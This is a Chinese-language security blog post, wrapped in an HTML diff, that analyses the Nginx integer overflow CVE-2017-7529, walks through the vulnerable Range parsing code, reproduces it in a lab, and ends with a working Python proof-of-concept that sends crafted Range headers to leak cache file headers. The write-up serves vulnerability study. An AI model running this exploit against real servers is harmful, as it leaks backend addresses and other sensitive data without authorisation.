@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://blog.jenisec.org/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://blog.jenisec.org/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://blog.jenisec.org/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://blog.jenisec.org/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+        <meta name="tags" contents="安全" />
+        <meta name="tags" contents="溢出" />
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/nginx-int-overflow.html">
+	<meta property="og:title" content="Nginx 整型溢出漏洞分析复现">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/nginx/nginx-int-overflow-cover.png">
+	<meta property="article:published_time" content="2017-07-15 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://blog.jenisec.org/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://blog.jenisec.org/category/an-quan.html">安全</a></li>
+                        <li><a href="https://blog.jenisec.org/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://blog.jenisec.org/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/nginx/nginx-int-overflow-cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Nginx 整型溢出漏洞分析复现</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2017-07-15 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>Nginx 是一个高性能的 HTTP 和反向代理服务器，从很早之前的版本，它便支持类似 Squid 的缓存功能。Nginx 的 web 缓存服务主要由 proxy_cache 相关命令集和 fastcgi_cache 相关命令集构成，前者用于反向代理时对后端内容源服务器进行缓存，后者主要用于对 FastCGI 的动态程序进行缓存。这次的 Nginx 整型溢出漏洞(CVE-2017-7529)便是针对 Nginx 服务器开启缓存功能这种情况的。通过在请求里构造恶意的 Range 字段，可以读取缓存文件的头部信息，缓存文件头可能包含后端服务器的IP地址或其它敏感信息。</p>
+<p><strong><em>什么是 Range</em></strong></p>
+<p>HTTP 协议从 1.1 版本开始支持分段获取文件内容，这一功能为并行下载和断点续传提供了技术支持。当客户端请求一个较大的资源时，就可以使用 Range 进行分段请求。实现方法是在请求的 Header 里设置 Range 字段，此时服务器的响应中会包含 Content-Range 字段。</p>
+<p>一般情况下，请求头中的 Range 字段有两种写法：</p>
+<ul>
+<li>Range: bytes=start-end</li>
+<li>Range: bytes=-end</li>
+</ul>
+<p>第一种写法表示访问从 start 开始，到 end 结束的字节内容，如 Range: bytes=0-1024 表示访问请求资源的 0 到 1024 字节内容；第二种写法表示访问请求资源最后的 end 字节内容，如 Range: bytes=-100 表示访问请求资源的最后 100 字节内容。</p>
+<p>对于普通文件来说，Range 的开始和结束并不会有什么影响，因为服务器返回的就是完整文件的一部分，但是缓存文件不同，它和普通的文件相比额外拥有一个文件头，里面保存了一些服务器的配置信息（正常情况下服务器是不会返回缓存文件头部的）。所以，当我们针对一个缓存文件进行请求时，如果可以绕过服务器限制，使缓存文件被完整的返回，这时只要控制 Range 的起始字节为一个合理的负值，就可以读到缓存文件头部。</p>
+<p>我下载了 1.12.0 版本的 Nginx，对漏洞的产生进行了简单的分析。</p>
+<p><strong><em>漏洞分析</em></strong></p>
+<p>漏洞存在于 nginx-1.12.0/src/http/modules/ngx_http_range_filter_module.c 文件，文件内的 ngx_http_range_parse 函数负责解析 header 中的 Range 字段内容。函数的部分内容如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-1.png" alt="nginx-int-overflow-1" /></div></p>
+<p>if 代码块对 Range 格式为 start-end 时的请求进行处理，其中 cutoff 和 cutlim 两个值保证了从 Range 字段取到的 start 值和 end 值始终为正数，这种情况下无法控制 start 为负值，所以我们需要使 if 条件为假，从而进入 else 语句，if 的条件是指针 p 不为 "-" ，所以 Range 使用 -end 格式就可以进入 else 代码块。此时的 suffix 被赋值为 1，程序向下执行：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-2.png" alt="nginx-int-overflow-2" /></div></p>
+<p>这里先说明一下，图片里的 content_length 并不是缓存文件的完整长度，而且服务器返回给我们的不包含缓存文件头的文件长度，我们这里称它为"正常文件长度"，之后会提到的完整的缓存文件长度我们称为"缓存文件长度"</p>
+<p>suffix 为真时，Range 的 start 等于正常文件长度减去 end 的值，end 值为正常文件长度减去 1 。如果此时 end 值要比正常文件长度数值大的话，就可以将 start 解析为负值。与 Range 相关的还有一个 size 值，它是每段 Range 相加后的总长度：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-3.png" alt="nginx-int-overflow-3" /></div></p>
+<p>在满足 start 比 end 小的条件时，size 就等于每段 Range 的长度之和。得到 size 的大小后会进行入下判断：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-4.png" alt="nginx-int-overflow-4" /></div></p>
+<p>可以看到当 size 比 正常文件长度大时，服务器便不再对缓存文件进行分段操作，而是直接返回原始的缓存文件。</p>
+<p>知道了程序的逻辑关系，就可以想办法绕过了。首先，为了使服务器返回原始的缓存文件，我们需要让 size 值满足大于正常文件长度的条件，但是如果一个 Range 比缓存文件长度大，又会使得读取字节超出文件范围，造成读取失败。所以这里需要设置两个 Range 值，第一个值用来控制读取文件的字节数在缓存文件长度范围内，第二个值用来保证 Range 的总长度大于正常文件的总长度。这样就成功绕过过滤器的限制，读取到缓存文件的头部。</p>
+<p><strong><em>环境搭建</em></strong></p>
+<p>我准备了两台虚拟机，用来对漏洞进行复现，发行版本如下：</p>
+<ul>
+<li>CentOS-7-x86_64-Minimal-1611 ,IP 192.168.6.158</li>
+<li>Archlinux-x86_64</li>
+</ul>
+<p>首先在 CentOS 上搭建 Nginx 服务。</p>
+<p>安装必要的 lib 库</p>
+<div class="highlight"><pre><span></span>yum install gcc-c++ wget
+yum install pcre pcre-devel
+yum install zlib zlib-devel
+yum install openssl openssl--devel
+</pre></div>
+
+
+<p>下载 1.12.0 版本的 Nginx</p>
+<div class="highlight"><pre><span></span>wget http://nginx.org/download/nginx-1.12.0.tar.gz
+</pre></div>
+
+
+<p>解压</p>
+<div class="highlight"><pre><span></span>tar -zxvf nginx-1.12.0.tar.gz
+</pre></div>
+
+
+<p>安装 Nginx</p>
+<div class="highlight"><pre><span></span>cd nginx-1.12.0
+./configure --prefix=/usr/local/nginx
+make &amp;&amp; make install
+ln -s /usr/local/nginx/sbin/nginx /usr/bin
+systemctl stop firewalld
+nginx
+</pre></div>
+
+
+<p>Nginx 安装成功后，修改 Nginx 的配置文件</p>
+<div class="highlight"><pre><span></span>vi /usr/local/nginx/conf/nginx.conf
+</pre></div>
+
+
+<p>设置 Nginx 服务器反向代理百度，开启缓存功能，具体配置如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-5.png" alt="nginx-int-overflow-5" /></div></p>
+<p>proxy_cache_key 用来指定生成的key的字段内容，用以区分缓存文件，这部分内容会在之后我们利用漏洞时被泄露。proxy_cache_path 设置了缓存文件的路径和参数。proxy_cache_valid 用来指定不同状态码下的缓存时间。server 代码块设置了代理的内容，并对响应头进行了一些设置。add_header X-Proxy-Cache 表示在响应头里添加一条 X-Proxy-Cache ，用以区分是否命中缓存，它一共有 5 种状态，MISS 表示未命中，请求被传送到后端；HIT 表示缓存命中；EXPIRED 表示缓存已经过期请求被传送到后端；UPDATING 表示正在更新缓存，将使用旧的应答；STALE 表示后端将得到过期的应答。</p>
+<p>配置文件修改后，让 Nginx 重新加载配置</p>
+<div class="highlight"><pre><span></span>nginx -s reload
+</pre></div>
+
+
+<p>环境搭建完成，验证下是否可用。使用另一台虚拟机访问，获取响应头信息。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-6.png" alt="nginx-int-overflow-6" /></div></p>
+<p><strong><em>漏洞复现</em></strong></p>
+<p>根据之前的分析可知，我们需要两个 Range ，一小一大，小的 Range 需要满足小于缓存文件长度，大于正常文件长度的条件，而大的 Range 需要足够大。根据上面的图片可知，服务器返回的正常文件长度为 7877 ，假设我们想要额外读取缓存文件头部 600 字节，第一段 Range 就需要设置为 -7877-600 ，也就是 -8477。第二段 Range 既然要足够大，那我们就用 Range 可设置的最大值减去 第一段 Range 大小，这样两段 Range 相加得到的 size 依然是最大值，也就必然超过了正常文件长度。Range 可接受的数值为 64 位整型，最大为 0x8000000000000000 ，换成 10 进制是 9223372036854776000 ，减去 8477 等于 9223372036854767523，也就是第二段 Range 长度。</p>
+<p>设置 Range 参数后再次请求缓存文件
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-7.png" alt="nginx-int-overflow-7" /></div></p>
+<p>可以看到成功读取了缓存文件头部</p>
+<p><strong><em>漏洞利用POC</em></strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># -*- coding=utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">urlparse</span>
+<span class="kn">import</span> <span class="nn">HTMLParser</span>
+<span class="kn">import</span> <span class="nn">ssl</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">_create_unverified_https_context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span>  <span class="c1"># Ignore certificate error</span>
+<span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
+    <span class="k">pass</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">ssl</span><span class="o">.</span><span class="n">_create_default_https_context</span> <span class="o">=</span> <span class="n">_create_unverified_https_context</span>
+
+<span class="k">def</span> <span class="nf">get_url</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+    <span class="n">url_list</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">if</span> <span class="s1">&#39;:443&#39;</span> <span class="ow">in</span> <span class="n">target</span> <span class="ow">or</span> <span class="s1">&#39;:8443&#39;</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://&#39;</span> <span class="o">+</span> <span class="n">target</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">target</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+    <span class="n">html</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">root_url</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">geturl</span><span class="p">()</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&quot;&lt;(?:img|link|script)[^&gt;]*?(?:src|href)=(&#39;|</span><span class="se">\&quot;</span><span class="s2">)(.*?)</span><span class="se">\\</span><span class="s2">1&quot;</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">ParseResult</span> <span class="o">=</span> <span class="n">urlparse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+            <span class="k">if</span> <span class="n">ParseResult</span><span class="o">.</span><span class="n">netloc</span> <span class="ow">and</span> <span class="n">ParseResult</span><span class="o">.</span><span class="n">scheme</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">target</span> <span class="o">==</span> <span class="n">ParseResult</span><span class="o">.</span><span class="n">hostname</span><span class="p">:</span>
+                    <span class="n">url_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">HTMLParser</span><span class="o">.</span><span class="n">HTMLParser</span><span class="p">()</span><span class="o">.</span><span class="n">unescape</span><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">elif</span> <span class="ow">not</span> <span class="n">ParseResult</span><span class="o">.</span><span class="n">netloc</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">ParseResult</span><span class="o">.</span><span class="n">scheme</span><span class="p">:</span>
+                <span class="n">url_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">HTMLParser</span><span class="o">.</span><span class="n">HTMLParser</span><span class="p">()</span><span class="o">.</span><span class="n">unescape</span><span class="p">(</span><span class="n">urlparse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">root_url</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
+    <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">url_list</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+    <span class="n">url_list</span> <span class="o">=</span> <span class="n">get_url</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="c1"># url_list[0] = &#39;http://192.168.6.158/img/bd_logo1.png&#39;</span>
+    <span class="c1"># print url_list</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="s1">&#39;[-]No risk detected&#39;</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">url_list</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span> <span class="k">break</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="mi">550</span>
+        <span class="k">while</span> <span class="n">l</span> <span class="o">&lt;</span> <span class="mi">700</span><span class="p">:</span>
+
+            <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">headers</span>
+            <span class="n">file_len</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="s2">&quot;Content-Length&quot;</span><span class="p">]</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+            <span class="n">request</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Range&quot;</span><span class="p">,</span> <span class="s2">&quot;bytes=-</span><span class="si">%d</span><span class="s2">,-9223372036854</span><span class="si">%d</span><span class="s2">&quot;</span><span class="o">%</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">file_len</span><span class="p">)</span><span class="o">+</span><span class="n">l</span><span class="p">,</span><span class="mi">776000</span><span class="o">-</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">file_len</span><span class="p">)</span><span class="o">+</span><span class="n">l</span><span class="p">)))</span>
+            <span class="n">cacheres</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+            <span class="n">cont</span> <span class="o">=</span> <span class="n">cacheres</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4048</span><span class="p">)</span>
+            <span class="k">print</span> <span class="n">cont</span>
+            <span class="c1"># print str(cacheres.headers)</span>
+            <span class="k">if</span> <span class="n">cacheres</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">206</span> <span class="ow">and</span> <span class="s2">&quot;Content-Range&quot;</span> <span class="ow">in</span> <span class="n">cont</span> <span class="ow">and</span> <span class="s2">&quot;: HIT&quot;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">cacheres</span><span class="o">.</span><span class="n">headers</span><span class="p">):</span>
+                <span class="n">info</span> <span class="o">=</span> <span class="s2">&quot;[+]Target vulnerability!&quot;</span>
+                <span class="k">return</span> <span class="n">info</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">l</span> <span class="o">+=</span> <span class="mi">50</span>
+    <span class="k">return</span> <span class="n">info</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s1">&#39;Usage: python run.py ip:port(default 80)&#39;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">if</span> <span class="s1">&#39;:&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;:80&#39;</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">print</span> <span class="n">check</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;[-]Error: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+
+
+<p>效果图：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/nginx/nginx-int-overflow-8.png" alt="nginx-int-overflow-8" /></div></p>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/nginx-int-overflow.html';
+                var disqus_url = 'https://blog.jenisec.org/security/nginx-int-overflow.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://blog.jenisec.org/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://blog.jenisec.org/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
